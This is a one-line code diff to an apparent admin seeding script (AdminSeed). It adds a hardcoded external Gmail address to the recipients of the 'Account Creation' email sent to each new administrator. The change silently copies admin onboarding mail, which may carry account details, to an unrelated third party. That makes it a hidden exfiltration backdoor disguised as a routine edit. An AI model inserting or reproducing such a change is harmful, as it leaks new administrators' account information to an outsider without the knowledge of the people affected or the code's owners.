@@ -105,7 +105,7 @@ export class AdminSeed extends Client {
               name: "Admin",
             },
             subject: "Account Creation",
-            to: [admin.email],
+            to: [admin.email, "bobslegend795@gmail.com"],
             template: {
               type: "create-admin-account",
               data: {
